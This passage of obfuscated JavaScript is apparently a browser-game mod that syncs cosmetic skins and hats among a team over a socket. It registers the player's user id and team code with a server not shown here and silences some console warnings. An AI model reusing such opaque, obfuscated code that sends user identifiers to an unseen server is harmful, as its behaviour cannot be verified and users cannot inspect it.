        _0x225e0b.preventDefault();
        _0x5d8f4f();
      }
    });
  }
  window.addEventListener("teamCodeChanged", function (_0xaa1790) {
    const _0xbc1eb = _0xaa1790.detail.teamCode;
    _0x38ded1.serviceDisabled = false;
    _0x38ded1.reconnectAttempts = 0;
    _0x38ded1.reconnectDelay = 5000;
    _0x48aeb3.registrationAttempts = 0;
    window._fixedTeamCode = null;
    if (_0x38ded1.socket && _0x38ded1.isConnected) {
      _0x38ded1.socket.disconnect();
    }
    setTimeout(() => {
      if (_0x383926()) {
        _0x2a7e8d();
      }
    }, 1000);
  });
  window.addEventListener("speedSettingsChanged", function (_0x835beb) {});
  async function _0x4a6054() {
    if (!_0x1aeaf3()) {
      setTimeout(_0x4a6054, 2000);
      return;
    }
    if (!window.vps) {
      window.vps = {};
    }
    if (!window.vps.favoriteSkins) {
      window.vps.favoriteSkins = [];
    }
    if (!window.vps.selectedHats) {
      window.vps.selectedHats = [];
    }
    await _0x4ef1e3();
    _0xd69f9e();
    if (_0x383926()) {
      _0x2a7e8d();
    } else {}
    window.toggleFavoriteSkin = _0x5d2358;
    window.toggleFavoriteHat = _0x5d8f4f;
    window.playerSync = {
      getStatus: () => ({
        registration: _0x48aeb3,
        connection: _0x38ded1,
        queueLength: _0x5e6b82.length,
        teamCode: _0x5ab45c(),
        isServiceAvailable: _0x383926(),
        userId: _0x200b37()?.wuid,
        speedSettings: {
          changeSpeed: _0x24e40b(),
          receiveDelay: _0x3a69c4()
        }
      }),
      forceRegister: () => {
        if (_0x383926() && _0x38ded1.socket) {
          const _0x4cbb19 = _0x200b37();
          const _0x2c6dae = _0x44b833();
          const _0x256f10 = _0x5ab45c();
          if (_0x4cbb19 && _0x2c6dae && _0x256f10 && _0x4cbb19.wuid) {
            _0x48aeb3.isRegistered = false;
            _0x38ded1.joinedRoom = false;
            _0x48aeb3.registrationAttempts = 0;
            _0x28fa50(_0x38ded1.socket, _0x4cbb19, _0x2c6dae, _0x256f10);
          }
        }
      },
      processQueue: _0x31d42b,
      enableService: () => {
        _0x38ded1.serviceDisabled = false;
        _0x38ded1.reconnectAttempts = 0;
        _0x38ded1.reconnectDelay = 5000;
        _0x48aeb3.registrationAttempts = 0;
        window._fixedTeamCode = null;
        if (_0x383926()) {
          _0x2a7e8d();
        }
      },
      forceDisconnect: () => {
        if (_0x38ded1.socket) {
          _0x38ded1.serviceDisabled = true;
          _0x38ded1.socket.disconnect();
        }
      },
      resetConnection: () => {
        _0x38ded1.reconnectAttempts = 0;
        _0x38ded1.reconnectDelay = 5000;
        _0x38ded1.serviceDisabled = false;
        _0x38ded1.isReconnecting = false;
      },
      testSpeed: (_0x217fc7 = "skin", _0x333bc1 = 999) => {
        const _0x33f36e = _0x24e40b();
        const _0x5a3455 = _0x3a69c4();
        if (_0x383926()) {
          _0x5a5637(_0x217fc7, _0x333bc1);
        } else {
          console.log("❌ الخدمة غير متاحة للاختبار");
        }
        return {
          changeSpeed: _0x33f36e,
          receiveDelay: _0x5a3455,
          servicAvailable: _0x383926()
        };
      }
    };
    const _0x123f61 = _0x200b37();
    const _0x5c2c94 = _0x5ab45c();
    if (!_0x383926()) {}
  }
  setTimeout(_0x4a6054, 1000);
})();
window.testPlayerSync = function () {
  const _0x428d7b = window.playerSync?.getStatus();
  console.log("📊 حالة النظام:", {
    isServiceAvailable: _0x428d7b?.isServiceAvailable,
    isRegistered: _0x428d7b?.registration?.isRegistered,
    isConnected: _0x428d7b?.connection?.isConnected,
    teamCode: _0x428d7b?.teamCode,
    userId: _0x428d7b?.userId,
    queueLength: _0x428d7b?.queueLength,
    reconnectAttempts: _0x428d7b?.connection?.reconnectAttempts,
    maxReconnectAttempts: _0x428d7b?.connection?.maxReconnectAttempts,
    speedSettings: _0x428d7b?.speedSettings
  });
  return _0x428d7b;
};
window.testSpeed = function () {
  if (window.playerSync && window.playerSync.testSpeed) {
    return window.playerSync.testSpeed();
  }
  console.error("❌ نظام المزامنة غير متاح");
  return null;
};
window.setTeamCode = function (_0x52ee23) {
  if (!_0x52ee23 || _0x52ee23.trim().length < 2) {
    console.error("❌ كود الفريق يجب أن يكون على الأقل حرفين");
    return false;
  }
  const _0x2b08d2 = _0x52ee23.trim();
  localStorage.setItem("wormup_team_code", _0x2b08d2);
  if (window.vps) {
    window.vps.teamCode = _0x2b08d2;
  }
  window.dispatchEvent(new CustomEvent("teamCodeChanged", {
    detail: {
      teamCode: _0x2b08d2
    }
  }));
  return true;
};
window.setTestSpeed = function (_0x5a523c = 1000, _0xcad44c = 500) {
  try {
    let _0x3b26ad = {};
    try {
      _0x3b26ad = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
    } catch (_0x42d94b) {
      _0x3b26ad = {};
    }
    if (!_0x3b26ad.syncSettings) {
      _0x3b26ad.syncSettings = {};
    }
    _0x3b26ad.syncSettings.changeSpeed = parseInt(_0x5a523c);
    _0x3b26ad.syncSettings.receiveDelay = parseInt(_0xcad44c);
    localStorage.setItem("SaveGamewup", JSON.stringify(_0x3b26ad));
    if (window.vps) {
      if (!window.vps.syncSettings) {
        window.vps.syncSettings = {};
      }
      window.vps.syncSettings.changeSpeed = parseInt(_0x5a523c);
      window.vps.syncSettings.receiveDelay = parseInt(_0xcad44c);
    }
    window.dispatchEvent(new CustomEvent("speedSettingsChanged", {
      detail: {
        changeSpeed: _0x5a523c,
        receiveDelay: _0xcad44c
      }
    }));
    return true;
  } catch (_0x4f7eba) {
    console.error("❌ خطأ في تعيين السرعة:", _0x4f7eba);
    return false;
  }
};
window.resetSpeed = function () {
  return window.setTestSpeed(0, 0);
};
const originalWarn = console.warn;
console.warn = function (..._0x6071d1) {
  const _0xdf1917 = _0x6071d1.join(" ");
  const _0x536a15 = ["[Violation]", "Permissions-Policy", "requestAnimationFrame", "deprecated", "gsi/web/guides/gis-migration"];
  if (_0x536a15.some(_0x34308f => _0xdf1917.includes(_0x34308f))) {
    return;
  }
  originalWarn.apply(console, _0x6071d1);
};